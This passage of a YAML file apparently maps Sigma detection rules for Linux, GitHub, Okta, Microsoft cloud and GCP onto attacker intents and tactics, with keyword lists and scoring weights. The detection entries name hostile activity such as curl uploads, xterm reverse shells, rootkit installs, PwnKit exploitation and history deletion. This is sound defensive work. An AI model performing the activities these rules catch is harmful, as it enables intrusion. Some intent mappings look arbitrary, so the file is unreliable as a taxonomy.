    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_00b90cc1_17ec_402c_96ad_3a8117d7a582
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a suspicious curl process start the adds a file to a web request
  conditions:
    summary:
      regex_any:
      - suspicious
      - curl
      - file
      - upload
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b86d356d_6093_443d_971c_9b07db583c68
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a suspicious curl process start on linux with set useragent
    options
  conditions:
    summary:
      regex_any:
      - suspicious
      - curl
      - change
      - user
      - agents
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_312b42b1_bded_4441_8b58_163a3af58775
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a potentially suspicious execution of a process located in
    the '/tmp/' folder
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - execution
      - from
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8344c0e5_5783_47cc_9cf9_a0f7fd03e6cf
  intent: reconnaissance
  tactic: discovery
  description: Detects usage of "find" binary in a suspicious manner to perform discovery
  conditions:
    summary:
      regex_any:
      - potential
      - discovery
      - activity
      - using
      - find
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cfec9d29_64ec_4a0f_9ffe_0fdb856d5446
  intent: unknown
  tactic: reconnaissance
  description: Detects execution of "git" in order to clone a remote repository that
    contain suspicious keywords which might be suspicious
  conditions:
    summary:
      regex_any:
      - suspicious
      - clone
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1182f3b3_e716_4efa_99ab_d2685d04360f
  intent: impact_operations
  tactic: impact
  description: Detects events in which a history file gets deleted, e.g. the ~/bash_history
    to remove traces of malicious activity
  conditions:
    summary:
      regex_any:
      - history
      - file
      - deletion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d7821ff1_4527_4e33_9f84_d0d57fa2fb66
  intent: unknown
  tactic: reconnaissance
  description: Detects events in which someone prints the contents of history files
    to the commandline or redirects it to a file for reconnaissance
  conditions:
    summary:
      regex_any:
      - print
      - history
      - file
      - contents
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a015e032_146d_4717_8944_7a1884122111
  intent: unknown
  tactic: resource_development
  description: Detects known hacktool execution based on image name.
  conditions:
    summary:
      regex_any:
      - linux
      - hacktool
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ea3ecad2_db86_4a89_ad0b_132a10d2db55
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious interactive bash as a parent to rather uncommon
    child processes
  conditions:
    summary:
      regex_any:
      - interactive
      - bash
      - suspicious
      - children
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d292e0af_9a18_420c_9525_ec0ac3936892
  intent: execution
  tactic: execution
  description: Detects java process spawning suspicious children
  conditions:
    summary:
      regex_any:
      - suspicious
      - java
      - children
      - processes
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_880973f3_9708_491c_a77b_2a35a1921158
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious process command line that starts with a shell that
    executes something and finally gets piped into another shell
  conditions:
    summary:
      regex_any:
      - linux
      - shell
      - pipe
      - shell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0f79c4d2_4e1f_4683_9c36_b5469a665e06
  intent: unknown
  tactic: reconnaissance
  description: Detects the execution of a text-based file access or inspection utilities
    to read the content of /etc/sudoers in order to potentially list all users that
    have sudo rights.
  conditions:
    summary:
      regex_any:
      - access
      - sudoers
      - file
      - content
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0cf7a157_8879_41a2_8f55_388dd23746b7
  intent: credential_harvesting
  tactic: credential_access
  description: Detects events with patterns found in commands used for reconnaissance
    on linux systems
  conditions:
    summary:
      regex_any:
      - linux
      - recon
      - indicators
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_86157017_c2b1_4d4a_8c33_93b8e67e4af4
  intent: impact_operations
  tactic: impact
  description: Detects changes of sensitive and critical files. Monitors files that
    you don't expect to change without planning on Linux system.
  conditions:
    summary:
      regex_any:
      - potential
      - suspicious
      - change
      - sensitive
      - critical
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2fade0b6_7423_4835_9d4f_335b39b83867
  intent: execution
  tactic: execution
  description: Detects execution of shells from a parent process located in a temporary
    (/tmp) directory
  conditions:
    summary:
      regex_any:
      - shell
      - execution
      - process
      - located
      - directory
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_30bcce26_51c5_49f2_99c8_7b59e3af36c7
  intent: execution
  tactic: execution
  description: Detects executions of scripts located in potentially suspicious locations
    such as "/tmp" via a shell such as "bash", "sh", etc.
  conditions:
    summary:
      regex_any:
      - execution
      - script
      - located
      - potentially
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c172b7b5_f3a1_4af2_90b7_822c63df86cb
  intent: impact_operations
  tactic: impact
  description: 'Detects the use of systemctl mask to disable system power management
    targets such as suspend, hibernate, or hybrid sleep.

    Adversaries may mask these targets to prevent a system from entering sleep or
    shutdown states, ensuring their malicious processes remain active and uninterrupted.

    This behavior can be associated with persistence or defense evasion, as it impairs
    normal system power operations to maintain long-term access or avoid termination
    of malicious activity.

    '
  conditions:
    summary:
      regex_any:
      - mask
      - system
      - power
      - settings
      - systemctl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_31545105_3444_4584_bebf_c466353230d2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of the "touch" process in service file.
  conditions:
    summary:
      regex_any:
      - touch
      - suspicious
      - service
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0326c3c8_7803_4a0f_8c5c_368f747f7c3e
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects execution of a the file "execve_hijack" which is used by the
    Triple Cross rootkit as a way to elevate privileges
  conditions:
    summary:
      regex_any:
      - triple
      - cross
      - ebpf
      - rootkit
      - execve
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_22236d75_d5a0_4287_bf06_c93b1770860f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects default install commands of the Triple Cross eBPF rootkit based
    on the "deployer.sh" script
  conditions:
    summary:
      regex_any:
      - triple
      - cross
      - ebpf
      - rootkit
      - install
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_08f26069_6f80_474b_8d1f_d971c6fedea0
  intent: impact_operations
  tactic: impact
  description: Detects execution of the "userdel" binary. Which is used to delete
    a user account and related files. This is sometimes abused by threat actors in
    order to cover their tracks
  conditions:
    summary:
      regex_any:
      - user
      - been
      - deleted
      - userdel
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6a50f16c_3b7b_42d1_b081_0fdd3ba70a73
  intent: persistence_installation
  tactic: persistence
  description: Detects usage of the "usermod" binary to add users add users to the
    root or suoders groups
  conditions:
    summary:
      regex_any:
      - user
      - added
      - root
      - sudoers
      - group
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7ab8f73a_fcff_428b_84aa_6a5ff7877dea
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the use of "vim" and it''s siblings commands to execute a
    shell or proxy commands.

    Such behavior may be associated with privilege escalation, unauthorized command
    execution, or to break out from restricted environments.

    '
  conditions:
    summary:
      regex_any:
      - gtfobin
      - abuse
      - linux
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_818f7b24_0fba_4c49_a073_8b755573b9c7
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious sub processes of web server processes
  conditions:
    summary:
      regex_any:
      - linux
      - webshell
      - indicators
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cf610c15_ed71_46e1_bdf8_2bd1a99de6c4
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the use of wget to download content to a suspicious directory
  conditions:
    summary:
      regex_any:
      - download
      - file
      - potentially
      - suspicious
      - directory
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4e25af4b_246d_44ea_8563_e42aacab006b
  intent: execution
  tactic: execution
  description: Detects usage of "xterm" as a potential reverse shell tunnel
  conditions:
    summary:
      regex_any:
      - potential
      - xterm
      - reverse
      - shell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0506a799_698b_43b4_85a1_ac4c84c720e9
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential PwnKit exploitation CVE-2021-4034 in auth logs
  conditions:
    summary:
      regex_any:
      - pwnkit
      - local
      - privilege
      - escalation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_36aa86ca_fd9d_4456_814e_d3b1b8e1e0bb
  intent: unknown
  tactic: resource_development
  description: Detects relevant ClamAV messages
  conditions:
    summary:
      regex_any:
      - relevant
      - clamav
      - message
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_af202fd3_7bff_4212_a25a_fb34606cfcbe
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious modification of crontab file.
  conditions:
    summary:
      regex_any:
      - modifying
      - crontab
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1edd77db_0669_4fef_9598_165bda82826d
  intent: credential_harvesting
  tactic: credential_access
  description: Detects suspicious session with two users present
  conditions:
    summary:
      regex_any:
      - guacamole
      - users
      - sharing
      - session
      - anomaly
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4c9d903d_4939_4094_ade0_3cb748f4d7da
  intent: unknown
  tactic: reconnaissance
  description: Detects exploitation attempt using public exploit code for CVE-2018-15473
  conditions:
    summary:
      regex_any:
      - sshd
      - error
      - message
      - '2018'
      - '15473'
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e76b413a_83d0_4b94_8e4c_85db4a5b8bdc
  intent: unknown
  tactic: initial_access
  description: Detects suspicious SSH / SSHD error messages that indicate a fatal
    or suspicious error that could be caused by exploiting attempts
  conditions:
    summary:
      regex_any:
      - suspicious
      - openssh
      - daemon
      - error
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7fcc54cb_f27d_4684_84b7_436af096f858
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287
  conditions:
    summary:
      regex_any:
      - sudo
      - privilege
      - escalation
      - '2019'
      - '14287'
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_49f5dfc1_f92e_4d34_96fa_feba3f6acf36
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects disabling security tools
  conditions:
    summary:
      regex_any:
      - disabling
      - security
      - tools
      - builtin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c8e35e96_19ce_4f16_aeb6_fd5588dc5365
  intent: unknown
  tactic: initial_access
  description: Detects suspicious DNS error messages that indicate a fatal or suspicious
    error that could be caused by exploiting attempts
  conditions:
    summary:
      regex_any:
      - suspicious
      - named
      - error
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_377f33a1_4b36_4ee1_acee_1dbe4b43cfbe
  intent: unknown
  tactic: initial_access
  description: Detects suspicious VSFTPD error messages that indicate a fatal or suspicious
    error that could be caused by exploiting attempts
  conditions:
    summary:
      regex_any:
      - suspicious
      - vsftpd
      - error
      - messages
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_16a71777_0b2e_4db7_9888_9d59cb75200b
  intent: data_staging
  tactic: collection
  description: Detects delete action in the Github audit logs for codespaces, environment,
    project and repo.
  conditions:
    summary:
      regex_any:
      - github
      - delete
      - action
      - invoked
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_34e1c7d4_0cd5_419d_9f1b_1dad3f61018d
  intent: unknown
  tactic: initial_access
  description: 'Dependabot performs a scan to detect insecure dependencies, and sends
    Dependabot alerts.

    This rule detects when an organization owner disables Dependabot alerts private
    repositories or Dependabot security updates for all repositories.

    '
  conditions:
    summary:
      regex_any:
      - outdated
      - dependency
      - vulnerability
      - alert
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8622c92d_c00e_463c_b09d_fd06166f6794
  intent: persistence_installation
  tactic: persistence
  description: Detects when a user disables a critical security feature for an organization.
  conditions:
    summary:
      regex_any:
      - github
      - high
      - risk
      - configuration
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_69b3bd1e_b38a_462f_9a23_fbdbf63d2294
  intent: data_exfiltration
  tactic: exfiltration
  description: 'Detects when the policy allowing forks of private and internal repositories
    is changed (enabled or cleared).

    '
  conditions:
    summary:
      regex_any:
      - github
      - fork
      - private
      - repositories
      - setting
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_eaa9ac35_1730_441f_9587_25767bde99d7
  intent: data_staging
  tactic: collection
  description: 'Detects when an organization member or an outside collaborator is
    added to or removed from a project board or has their permission level changed
    or when an owner removes an outside collaborator from an organization or when
    two-factor authentication is required in an organization and an outside collaborator
    does not use 2FA or disables 2FA.

    '
  conditions:
    summary:
      regex_any:
      - github
      - outside
      - collaborator
      - detected
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ccd55945_badd_4bae_936b_823a735d37dd
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects if the push protection feature is disabled for an organization,
    enterprise, repositories or custom pattern rules.
  conditions:
    summary:
      regex_any:
      - github
      - push
      - protection
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_04ad83ef_1a37_4c10_b57a_81092164bf33
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects when a repository or an organization is being transferred to
    another location.
  conditions:
    summary:
      regex_any:
      - github
      - repository
      - organization
      - transferred
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3883d9a0_fd0f_440f_afbb_445a2a799bb8
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects if the secret scanning feature is disabled for an enterprise
    or repository.
  conditions:
    summary:
      regex_any:
      - github
      - secret
      - scanning
      - feature
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2f575940_d85e_4ddc_af13_17dad6f1a0ef
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects when changes are made to the SSH certificate configuration
    of the organization.
  conditions:
    summary:
      regex_any:
      - github
      - certificate
      - configuration
      - changed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9058ca8b_f397_4fd1_a9fa_2b7aad4d6309
  intent: credential_harvesting
  tactic: credential_access
  description: Detects access to Okta admin functions through proxy.
  conditions:
    summary:
      regex_any:
      - okta
      - admin
      - functions
      - access
      - through
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_413d4a81_6c98_4479_9863_014785fd579c
  intent: persistence_installation
  tactic: persistence
  description: Detects when an the Administrator role is assigned to an user or group.
  conditions:
    summary:
      regex_any:
      - okta
      - admin
      - role
      - assigned
      - user
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_139bdd4b_9cd7_49ba_a2f4_744d0a8f5d8c
  intent: persistence_installation
  tactic: persistence
  description: Detects when a new admin role assignment is created. Which could be
    a sign of privilege escalation or persistence
  conditions:
    summary:
      regex_any:
      - okta
      - admin
      - role
      - assignment
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_19951c21_229d_4ccb_8774_b993c3ff3c5c
  intent: persistence_installation
  tactic: persistence
  description: Detects when a API token is created
  conditions:
    summary:
      regex_any:
      - okta
      - token
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cf1dbc6b_6205_41b4_9b88_a83980d2255b
  intent: impact_operations
  tactic: impact
  description: Detects when a API Token is revoked.
  conditions:
    summary:
      regex_any:
      - okta
      - token
      - revoked
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7899144b_e416_4c28_b0b5_ab8f9e0a541d
  intent: impact_operations
  tactic: impact
  description: Detects when an application is modified or deleted.
  conditions:
    summary:
      regex_any:
      - okta
      - application
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8f668cc4_c18e_45fe_ad00_624a981cf88a
  intent: impact_operations
  tactic: impact
  description: Detects when an application Sign-on Policy is modified or deleted.
  conditions:
    summary:
      regex_any:
      - okta
      - application
      - sign
      - policy
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ee39a9f7_5a79_4b0a_9815_d36b3cf28d3e
  intent: unknown
  tactic: initial_access
  description: Detects when Okta FastPass prevents a known phishing site.
  conditions:
    summary:
      regex_any:
      - okta
      - fastpass
      - phishing
      - detection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_969c7590_8c19_4797_8c1b_23155de6e7ac
  intent: persistence_installation
  tactic: persistence
  description: Detects when a new identity provider is created for Okta.
  conditions:
    summary:
      regex_any:
      - okta
      - identity
      - provider
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_50e068d7_1e6b_4054_87e5_0a592c40c7e0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when an attempt at deactivating  or resetting MFA.
  conditions:
    summary:
      regex_any:
      - okta
      - reset
      - deactivated
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9f308120_69ed_4506_abde_ac6da81f4310
  intent: impact_operations
  tactic: impact
  description: Detects when an Network Zone is Deactivated or Deleted.
  conditions:
    summary:
      regex_any:
      - okta
      - network
      - zone
      - deactivated
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a0b38b70_3cb5_484b_a4eb_c4d8e7bcc0a9
  intent: unknown
  tactic: initial_access
  description: Detects when Okta identifies new activity in the Admin Console.
  conditions:
    summary:
      regex_any:
      - okta
      - admin
      - console
      - behaviours
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_91b76b84_8589_47aa_9605_c837583b82a9
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects when a user has potentially entered their password into the

    username field, which will cause the password to be retained in log files.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - okta
      - password
      - alternateid
      - field
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0c97c1d3_4057_45c9_b148_1de94b631931
  intent: impact_operations
  tactic: impact
  description: Detects when an Policy Rule is Modified or Deleted.
  conditions:
    summary:
      regex_any:
      - okta
      - policy
      - rule
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5c82f0b9_3c6d_477f_a318_0e14a1df73e0
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects when an security threat is detected in Okta.
  conditions:
    summary:
      regex_any:
      - okta
      - security
      - threat
      - detected
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_07e97cc6_aed1_43ae_9081_b3470d2367f1
  intent: unknown
  tactic: resource_development
  description: Detects when an Okta end-user reports activity by their account as
    being potentially suspicious.
  conditions:
    summary:
      regex_any:
      - okta
      - suspicious
      - activity
      - reported
      - user
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6cc2b61b_d97e_42ef_a9dd_8aa8dc951657
  intent: impact_operations
  tactic: impact
  description: Detects when unauthorized access to app occurs.
  conditions:
    summary:
      regex_any:
      - okta
      - unauthorized
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_14701da0_4b0f_4ee6_9c95_2ffb4e73bb9a
  intent: impact_operations
  tactic: impact
  description: Detects when an user account is locked out.
  conditions:
    summary:
      regex_any:
      - okta
      - user
      - account
      - locked
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bde30855_5c53_4c18_ae90_1ff79ebc9578
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when an Okta user session starts where the user is behind an
    anonymising proxy service.
  conditions:
    summary:
      regex_any:
      - okta
      - user
      - session
      - start
      - anonymising
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_13f2d3f5_6497_44a7_bf5f_dc13ffafe5dc
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects a successful login to the Microsoft Intune Company Portal
    which could allow bypassing Conditional Access Policies and InTune device trust
    using a tool like TokenSmith.

    '
  conditions:
    summary:
      regex_any:
      - azure
      - login
      - bypassing
      - conditional
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_60de9b57_dc4d_48b9_a6a0_b39e0469f876
  intent: credential_harvesting
  tactic: credential_access
  description: Detects disabling of Multi Factor Authentication.
  conditions:
    summary:
      regex_any:
      - disabling
      - multi
      - factor
      - authentication
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_58f88172_a73d_442b_94c9_95eaed3cbb36
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the addition of a new Federated Domain.
  conditions:
    summary:
      regex_any:
      - federated
      - domain
      - added
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_42127bdd_9133_474f_a6f1_97b6c08a4339
  intent: persistence_installation
  tactic: persistence
  description: Detects the addition of a new Federated Domain.
  conditions:
    summary:
      regex_any:
      - federated
      - domain
      - added
      - exchange
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a3501e8e_af9e_43c6_8cd6_9360bdaae498
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects when a Microsoft Cloud App Security reported users were active
    from an IP address identified as risky by Microsoft Threat Intelligence.

    These IP addresses are involved in malicious activities, such as Botnet C&C, and
    may indicate compromised account.

    '
  conditions:
    summary:
      regex_any:
      - activity
      - from
      - suspicious
      - addresses
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2e669ed8_742e_4fe5_b3c4_5a59b486c2ee
  intent: impact_operations
  tactic: impact
  description: 'Detects when a Microsoft Cloud App Security reported for users whose
    account were terminated in Azure AD, but still perform activities in other platforms
    such as AWS or Salesforce.

    This is especially relevant for users who use another account to manage resources,
    since these accounts are often not terminated when a user leaves the company.

    '
  conditions:
    summary:
      regex_any:
      - activity
      - performed
      - terminated
      - user
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d8b0a4fe_07a8_41be_bd39_b14afa025d95
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects when a Microsoft Cloud App Security reported when users were
    active from an IP address that has been identified as an anonymous proxy IP address.
  conditions:
    summary:
      regex_any:
      - activity
      - from
      - anonymous
      - addresses
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0f2468a2_5055_4212_a368_7321198ee706
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects when a Microsoft Cloud App Security reported when an activity
    occurs from a location that wasn't recently or never visited by any user in the
    organization.
  conditions:
    summary:
      regex_any:
      - activity
      - from
      - infrequent
      - country
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2b669496_d215_47d8_bd9a_f4a45bf07cda
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects when a Microsoft Cloud App Security reported when a user or
    IP address uses an app that is not sanctioned to perform an activity that resembles
    an attempt to exfiltrate information from your organization.
  conditions:
    summary:
      regex_any:
      - data
      - exfiltration
      - unsanctioned
      - apps
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d7eab125_5f94_43df_8710_795b80fa1189
  intent: unknown
  tactic: initial_access
  description: Detects when a Microsoft Cloud App Security reported a risky sign-in
    attempt due to a login associated with an impossible travel.
  conditions:
    summary:
      regex_any:
      - microsoft
      - impossible
      - travel
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c191e2fa_f9d6_4ccf_82af_4f2aba08359f
  intent: unknown
  tactic: initial_access
  description: Detects when a Microsoft Cloud App Security reported when a user signs
    into your sanctioned apps from a risky IP address.
  conditions:
    summary:
      regex_any:
      - logon
      - from
      - risky
      - address
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bd132164_884a_48f1_aa2d_c6d646b04c69
  intent: impact_operations
  tactic: impact
  description: Detects when a Microsoft Cloud App Security reported when a user uploads
    files to the cloud that might be infected with ransomware.
  conditions:
    summary:
      regex_any:
      - microsoft
      - potential
      - ransomware
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_18b88d08_d73e_4f21_bc25_4b9892a4fdd0
  intent: data_staging
  tactic: collection
  description: Alert on when a user has performed an eDiscovery search or exported
    a PST file from the search. This PST file usually has sensitive information including
    email body content
  conditions:
    summary:
      regex_any:
      - export
      - alert
      - using
      - ediscovery
      - alert
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6897cd82_6664_11ed_9022_0242ac120002
  intent: data_staging
  tactic: collection
  description: Alert when a user has performed an export to a search using 'New-ComplianceSearchAction'
    with the '-Export' flag. This detection will detect PST export even if the 'eDiscovery
    search or exported' alert is disabled in the O365.This rule will apply to ExchangePowerShell
    usage and from the cloud.
  conditions:
    summary:
      regex_any:
      - export
      - alert
      - using
      - compliancesearchaction
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ee111937_1fe7_40f0_962a_0eb44d57d174
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects when a Microsoft Cloud App Security reported when an app downloads
    multiple files from Microsoft SharePoint or Microsoft OneDrive in a manner that
    is unusual for the user.
  conditions:
    summary:
      regex_any:
      - suspicious
      - oauth
      - file
      - download
      - activities
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_78a34b67_3c39_4886_8fb4_61c46dc18ecd
  intent: impact_operations
  tactic: impact
  description: Detects when a Microsoft Cloud App Security reported a user has deleted
    a unusual a large volume of files.
  conditions:
    summary:
      regex_any:
      - microsoft
      - unusual
      - volume
      - file
      - deletion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ff246f56_7f24_402a_baca_b86540e3925c
  intent: unknown
  tactic: initial_access
  description: Detects when a Security Compliance Center reported a user who exceeded
    sending limits of the service policies and because of this has been restricted
    from sending email.
  conditions:
    summary:
      regex_any:
      - microsoft
      - user
      - restricted
      - from
      - sending
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_32438676_1dba_4ac7_bf69_b86cba995e05
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects when an access policy that is applied to a GCP cloud resource
    is deleted.

    An adversary would be able to remove access policies to gain access to a GCP cloud
    resource.

    '
  conditions:
    summary:
      regex_any:
      - access
      - policy
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_76737c19_66ee_4c07_b65a_a03301d1573d
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the deployment of workloads that are deployed by using the
    break-glass flag to override Binary Authorization controls.

    '
  conditions:
    summary:
      regex_any:
      - break
      - glass
      - container
      - workload
      - deployed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4d9f2ee2_c903_48ab_b9c1_8c0f474913d0
  intent: impact_operations
  tactic: impact
  description: Detects when storage bucket is modified or deleted in Google Cloud.
  conditions:
    summary:
      regex_any:
      - google
      - cloud
      - storage
      - buckets
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_234f9f48_904b_4736_a34c_55d23919e4b7
  intent: impact_operations
  tactic: impact
  description: Identifies when sensitive information is re-identified in google Cloud.
  conditions:
    summary:
      regex_any:
      - google
      - cloud
      - identifies
      - sensitive
      - information
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_28268a8f_191f_4c17_85b2_f5aa4fa829c3
  intent: impact_operations
